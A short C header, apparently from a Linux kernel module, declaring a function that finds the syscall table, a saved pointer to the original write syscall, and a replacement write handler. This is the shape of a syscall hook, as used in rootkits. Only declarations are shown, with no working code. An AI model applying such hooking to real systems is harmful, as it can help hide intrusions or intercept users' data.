#ifndef _SYSCALLS_H_
#define _SYSCALLS_H_

#include "common.h"

ptr_t find_syscall_table(void);

extern asmlinkage ssize_t (*original_write)(int fd, const char __user *buff, ssize_t count);
asmlinkage ssize_t duck_write(int fd, const char __user *buff, ssize_t count);

#endif /* _SYSCALLS_H_ */